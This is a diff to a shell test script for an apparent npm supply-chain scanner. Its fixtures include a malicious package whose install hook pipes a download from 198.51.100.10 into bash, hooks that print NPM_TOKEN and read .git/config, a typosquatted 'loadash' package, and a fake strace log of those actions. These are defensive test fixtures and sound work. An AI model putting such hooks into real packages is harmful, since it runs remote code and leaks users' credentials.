@@ -28,11 +28,19 @@ cat > "$WORK_DIR/project/node_modules/bad-pkg/package.json" <<'JSON'
   "name": "bad-pkg",
   "version": "1.0.0",
   "scripts": {
-    "install": "curl http://198.51.100.10/payload.sh | bash",
+    "install": "node install.js",
     "prepare": "node -e \"console.log(process.env.NPM_TOKEN)\""
   }
 }
 JSON
+cat > "$WORK_DIR/project/node_modules/bad-pkg/install.js" <<'JS'
+const cp = require("child_process");
+const fs = require("fs");
+
+console.log(process.env.NPM_TOKEN);
+cp.execSync("echo suspicious");
+fs.readFileSync(".git/config", "utf8");
+JS
 cat > "$WORK_DIR/project/node_modules/loadash/package.json" <<'JSON'
 {
   "name": "loadash",
@@ -45,6 +53,9 @@ JSON
   anvil-scan-lifecycle-scripts > lifecycle.json
   assert_jq '.summary.packagesWithLifecycleScripts == 2' lifecycle.json
   assert_jq '.summary.highConfidenceFindings >= 2' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_SECRET_ENV_REFERENCE" and .file == "install.js")' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_CHILD_PROCESS" and .file == "install.js")' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_SECRET_FILE_REFERENCE" and .file == "install.js")' lifecycle.json
   assert_jq '.policy.strict.enabled == false' lifecycle.json
 
   ANVIL_REPORT_DIR="$WORK_DIR/project/reports" anvil-dep-report >/tmp/anvil-dep-report.out
@@ -70,13 +81,15 @@ cat > "$WORK_DIR/logs/strace.log" <<'LOG'
 123 execve("/usr/bin/curl", ["curl", "http://198.51.100.10/payload.sh"], 0x7ffc) = 0
 123 connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("198.51.100.10")}, 16) = -1 EINPROGRESS
 123 openat(AT_FDCWD, "/home/node/.npmrc", O_RDONLY) = 4
+123 openat(AT_FDCWD, "/workspace/project/.git/config", O_RDONLY) = 5
 LOG
 anvil-scan-install-logs "$WORK_DIR/logs/npm-install.log" "$WORK_DIR/logs/strace.log" > "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.high >= 2' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.medium >= 2' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.executedProcesses == 2' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.outboundConnections == 1' "$WORK_DIR/logs/ioc-report.json"
-assert_jq '.summary.sensitiveFileAccesses == 1' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.summary.sensitiveFileAccesses == 2' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.filesystemSummary.sensitiveAccesses[] | select(.path == "/workspace/project/.git/config")' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.processSummary.processTree[] | select(.pid == "123" and .parentPid == "100" and .command == "curl")' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.mediumConfidenceFindings[] | select(.code == "DIRECT_IP_CONNECTION")' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.mediumConfidenceFindings[] | select(.code == "NON_STANDARD_PORT")' "$WORK_DIR/logs/ioc-report.json"
